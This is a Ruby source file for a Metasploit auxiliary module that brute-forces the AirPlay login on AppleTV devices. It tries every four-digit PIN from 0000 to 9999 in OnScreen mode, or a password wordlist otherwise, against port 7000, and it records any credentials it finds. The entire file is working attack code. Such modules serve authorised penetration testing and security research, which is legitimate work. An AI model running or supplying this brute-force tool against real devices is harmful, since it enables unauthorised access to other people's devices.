##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'           => 'AppleTV AirPlay Login Utility',
      'Description'    => %q(
        This module attempts to authenticate to an AppleTV service with username 'AirPlay'.
        The device has two different access control modes: OnScreen and Password. The difference
        is the password in Onscreen is number-only and four digits long, in that case the module
        will make sure to cover all of them - from 0000 to 9999. The Password mode is more complex,
        therefore it's better to supply your own password list in PASS_FILE, and/or enable
        DB_ALL_PASS and resue all the passwords you've collected in the database.
      ),
      'Author'         => ['0a29406d9794e4f9b30b3c5d6702c708'],
      'License'        => MSF_LICENSE,
      'DefaultOptions' => {
        'RPORT'           => 7000,  # AppleTV's server
        'STOP_ON_SUCCESS' => true   # There's only one password with the same username
      }
    )

    register_options(
      [
        OptBool.new('Onscreen', [false, 'Enable if AppleTV is using the Onscreen access control', false]),
        OptPath.new('PASS_FILE', [
          false,
          'File containing passwords, one per line',
          File.join(Msf::Config.data_directory, 'wordlists', 'http_default_pass.txt')
        ]
    )], self.class)

    deregister_options(
      'USERNAME', 'USER_AS_PASS', 'DB_ALL_CREDS', 'DB_ALL_USERS', 'NTLM::SendLM', 'NTLM::SendNTLM',
      'NTLM::SendSPN', 'NTLM::UseLMKey', 'NTLM::UseNTLM2_session', 'NTLM::UseNTLMv2',
      'REMOVE_USERPASS_FILE', 'REMOVE_USER_FILE', 'DOMAIN'
    )
  end

  def prefix
    "#{@ip}:#{rport}"
  end

  def get_numbers_only(passwords)
    passwords.keep_if { |p| p =~ /^\d+$/ }
  end


  #
  # Overrides extract_words from auth_brute.rb
  #
  def extract_words(wordfile)
    save_array = super
    save_array = get_numbers_only(save_array) if datastore['Onscreen']
    save_array
  end


  #
  # Overrides the build_credentials_array method from auth_brute.rb
  #
  def build_credentials_array
    credentials = super

    more_passwords = []
    if datastore['Onscreen']
      (0..9999).each do |n|
        more_passwords << "%04d" %n
      end
    end

    unless more_passwords.empty?
      credentials.concat(combine_users_and_passwords('', more_passwords))
      credentials.uniq!
    end

    credentials
  end

  def do_login(pass)
    vprint_status("#{prefix} - Trying password: #{pass}")

    res = send_request_raw({
      'uri' => '/stop',
      'method' => 'POST',
      'username' => 'AirPlay',
      'password' => pass
    })

    if res.nil?
      print_error("#{prefix} - Connection timedout")
      return :connection_error
    end

    if [200, 301, 302].include?(res.code)
      print_good("#{prefix} - Successful login (#{res.code.to_s}) - Pass: #{pass}")
      report_auth_info(
          host: @ip,
          port: rport,
          sname: 'http',
          user: 'AirPlay', # This is hardcoded in the device
          pass: pass,
          realm: 'AirPlay',
          proof: "WEBAPP=\"Generic\", PROOF=#{res.code.to_s}",
          source_type: 'user_supplied',
          active: true
      )
      return :next_user
    end

    return
  end

  def run_host(ip)
    @ip = ip
    print_status("#{prefix} - Attempting to login to AirPlay")
    each_user_pass { |user, pass|
      do_login(pass)
    }
  end
end
